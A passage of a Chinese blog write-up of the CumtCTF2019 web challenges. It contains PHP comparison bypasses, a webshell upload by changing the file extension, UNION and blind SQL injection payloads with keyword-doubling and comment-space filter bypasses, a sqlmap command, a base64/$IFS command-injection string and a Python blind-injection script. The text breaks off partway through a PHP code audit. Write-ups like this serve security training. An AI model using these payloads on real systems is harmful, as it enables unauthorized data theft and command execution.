@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>CumtCTF2019Ⅱ——Writeup（Web详解） | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CumtCTF2019Ⅱ——Writeup（Web详解）</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 3, 2019&nbsp;&nbsp;11:55:33</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeup/">Writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="Web1：签到题"><a href="#Web1：签到题" class="headerlink" title="Web1：签到题"></a>Web1：签到题</h4><p>1、打开题目，源码直接显示在网页上。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302192458801.png" alt="web1"></p>
+<p>2、发现构造0ver、0ver1、0ver2即可，下面就进行代码审计：</p>
+<p>（1）首先构造 0ver，有以下三个条件：<br>① <code>ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)</code>，即要进行一次或多次 0-9 数字正则表达式匹配<br>② <code>in_array($a,$white_list)</code>，即0ver 中要有 range（0，9）<br>③ <code>strlen($a)&gt;1</code>，即0ver 的长度要大于 1</p>
+<p>一开始以为要考ereg()截断漏洞，其实是in_array()松散比较，即</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="literal">true</span>))); </span><br><span class="line">返回值:<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;01&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>)));</span><br><span class="line">返回值也是:<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>为什么是这样呢？</p>
+<ul>
+<li><code>in_array(&#39;b&#39;, array(&#39;a&#39;=&gt;true))</code>  实质上是<code>&#39;b&#39;==true</code> 这样的类型比较，b 是变量或者一个字符串string，和bool 类型比较，结果是true。<br>但是如果 <code>&#39;b&#39;===true</code> 结果可能就不一样了，返回值:false，就是类型比较的问题。</li>
+<li>第二个例子，也就是本题的考点之一。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(&#x27;01&#x27;==1);  返回值:true</span><br><span class="line">   var_dump(&#x27;01&#x27;===1); 返回值:false </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>因此构造： 0ver&#x3D;01</strong> </p>
+<p>（2）构造 0ver1 和 0ver2，有以下条件：</p>
+<pre><code>md5($c) === md5($b) &amp;&amp; ($b !== $c)
+</code></pre>
+<p>所以要构造 md5 相同，真值不同的两个参数，但注意这里 md5 用&#x3D;&#x3D;&#x3D;判断，所以不能利用md5 开头是 0e 的字符串来绕过，但可以利用数组绕过。<br><strong>因此构造：0ver1[]&#x3D;1&amp;0ver2[]&#x3D;2</strong></p>
+<p>3、最终构造的payload为：<code>?0ver=01&amp;0ver1[]=1&amp;0ver2[]=2</code>，得到 flag。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190303100623661.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web2：SimpleUpload签到"><a href="#Web2：SimpleUpload签到" class="headerlink" title="Web2：SimpleUpload签到"></a>Web2：SimpleUpload签到</h4><p>1、只允许png&#x2F;gif&#x2F;jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302201142580.png" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302201312733.png" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302201335585.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web3：小型线上赌场"><a href="#Web3：小型线上赌场" class="headerlink" title="Web3：小型线上赌场"></a>Web3：小型线上赌场</h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302201610824.png" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302202053379.png" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302202211400.jpg" alt="在这里插入图片描述"><br>4、进行代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$invest</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;invest&#x27;</span>];  </span><br><span class="line">	<span class="variable">$rand</span> = <span class="title function_ invoke__">rand</span>(<span class="number">2</span>,<span class="number">50</span>);  </span><br><span class="line"></span><br><span class="line">	<span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;invest&#x27;</span>]));	</span><br><span class="line">	<span class="comment">//除去空格后所传入&#x27;invest&#x27;的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//限制非数字和0</span></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">	    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$value</span>)||<span class="variable">$value</span> == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">	        <span class="keyword">die</span>(<span class="string">&#x27;no no no!&#x27;</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="title function_ invoke__">number_format</span>(<span class="variable">$invest</span>*<span class="variable">$rand</span>);</span><br><span class="line">	<span class="comment">//number_format()函数通过千位分组来格式化数字,返回的是字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$money</span>));</span><br><span class="line">	<span class="comment">//再将上一步中格式化进去的逗号去掉，并用intval()函数用于获取变量的整数值</span></span><br><span class="line">	<span class="variable">$guess</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$guess</span> == <span class="variable">$money</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$money</span>)===<span class="variable">$len</span>) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后的判断逻辑为：猜测的数(guess)与money相等，且money的长度与invest的长度相等。<br>问题出现在<code>intval()</code>函数上，关于此函数返回值如下：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302203014110.png" alt="在这里插入图片描述"><br>也就是说当传入<code>intval()</code>的参数足够大时，其返回值根据操作系统的不同，是固定的数值（32位：2147483647，64位：9223372036854775807），这一题也就是传入的invest的数足够大时，无论随机数是多少，经过<code>intval()</code>函数处理过的money的值均是不变的。</p>
+<p>这样思路也就很清楚了，只需将guess的值等于money的64位上限值，也就是9223372036854775807，invest的长度要等于money的长度（任意19位数字），即可得到flag。<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302203942515.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web4：SimpleSQLi"><a href="#Web4：SimpleSQLi" class="headerlink" title="Web4：SimpleSQLi"></a>Web4：SimpleSQLi</h4><p>一道没有任何过滤的SQL注入题<br>（1）手工注入过程如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆表名</span><br><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())  --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302210130304.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段名</span><br><span class="line">![?id=-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagishere&#x27;)  --+](https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/2019030220581225.png)</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302210139384.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">?id=-1&#x27; union select 1,2,(select flag from flagishere) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302210147697.png" alt="在这里插入图片描述"><br>（2）sqlmap注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere -C flag --dump</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302213143188.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web5：真的简单。。"><a href="#Web5：真的简单。。" class="headerlink" title="Web5：真的简单。。"></a>Web5：真的简单。。</h4><p>（1）也是一道SQL注入题，但是过滤了 <code>union</code> 、<code>select</code>、<code>or</code>、<code>and</code>等关键词，可以通过<strong>双写绕过</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">爆表名(这里注意information中也包含&#x27;or&#x27;,所以也要双写&#x27;or&#x27;)</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,2,(seleselectct group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())  --+</span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,2,(seleselectct group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag&#x27;)  --+</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">?id=-1&#x27; uniunionon seleselectct 1,2,(seleselectct flag from flag) --+</span><br></pre></td></tr></table></figure>
+<p>最终得到：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302212017142.png" alt="在这里插入图片描述"><br>并没有直接爆出flag，看来不是一道简单的SQL注入题。</p>
+<p>（2）打开admin_08163314&#x2F;exec.php页面，是后台命令执行。</p>
+<p>输入如下命令进行执行，即可获得flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo$IFS&quot;Y2F0IC9mbGFnXzMzMTQvZmxhZw==&quot;|base64$IFS-d`</span><br></pre></td></tr></table></figure>
+<p>(对命令执行的绕过方法还不太熟悉，题目不能复现了，等学习后再详细解释吧…)<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190302213050858.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web6：SimpleSQLi2"><a href="#Web6：SimpleSQLi2" class="headerlink" title="Web6：SimpleSQLi2"></a>Web6：SimpleSQLi2</h4><p>（1）这还是一道SQL注入题，但是只会回显<code>Welcome to CUMTCTF&#39;2019~</code>和<code>NoNoNo~</code>两个页面，因此可以判断为SQL盲注。<br>（2）过滤方式和上一题差不多，但测试发现只要构造的payload里有含有空格，均返回<code>NoNoNo~</code>页面，所以判断空格被过滤了。<br>（3）关键词依旧可以通过双写绕过，空格可以通过<code>/**/</code>绕过，通过下面判断出为数字型注入，构造的代码可以直接执行。</p>
+<table>
+<thead>
+<tr>
+<th><strong>id</strong></th>
+<th><strong>返回页面</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id&#x3D;1</td>
+<td>Welcome to CUMTCTF’2019~</td>
+</tr>
+<tr>
+<td>id&#x3D;1’</td>
+<td>NoNoNo~</td>
+</tr>
+<tr>
+<td>id&#x3D;1&#x2F;**&#x2F;anandd&#x2F;**&#x2F;1&#x3D;1--+</td>
+<td>Welcome to CUMTCTF’2019~</td>
+</tr>
+<tr>
+<td>id&#x3D;1&#x2F;**&#x2F;anandd&#x2F;**&#x2F;1&#x3D;2--+</td>
+<td>NoNoNo~</td>
+</tr>
+<tr>
+<td>id&#x3D;1’&#x2F;**&#x2F;anandd&#x2F;**&#x2F;1&#x3D;1--+</td>
+<td>NoNoNo~</td>
+</tr>
+<tr>
+<td>id&#x3D;1’&#x2F;**&#x2F;anandd&#x2F;**&#x2F;1&#x3D;2--+</td>
+<td>NoNoNo~</td>
+</tr>
+</tbody></table>
+<p>知道过滤方式之后，就可以写脚本来爆破:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://bxs.cumt.edu.cn:30010/test/index.php&#x27;</span></span><br><span class="line">payloads = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;_&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:  <span class="comment"># 依次跑下面三个payload</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=if(substr((seleselectct/**/binary/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;, 1, 0)&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=if(substr((selselectect/**/binary/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;flagishere&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;, 1, 0)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字段</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=if(substr((selselectect/**/binary/**/group_concat(flag)/**/from/**/flagishere) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;, 1, 0)&quot;</span></span><br><span class="line">        <span class="comment"># 这里通过加入binary来区分大小写，因为flag中大小写都可能包含</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;NoNoNo&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)    </span><br></pre></td></tr></table></figure>
+<p>最终获得flag如下：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/CumtCTF2019-Web-Writeup/20190303130639145.png" alt="在这里插入图片描述"><br><br></p>
+<h4 id="Web7：文件管理系统"><a href="#Web7：文件管理系统" class="headerlink" title="Web7：文件管理系统"></a>Web7：文件管理系统</h4><p>1、先扫目录，发现可以下载源码，进行代码审计。<br>2、查看upload.php代码，发现是如下白名单验证，无法上传绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>]; </span><br><span class="line">        <span class="comment">// $path_parts[&quot;extension&quot;] = &quot;.jpg&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="comment">//$path_parts[&#x27;filename&#x27;] = &quot;&#x27;,extension=&#x27;&#x27;,filename=&#x27;webshell.jpg&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], ROOT . UPLOAD_DIR . <span class="variable">$name</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">     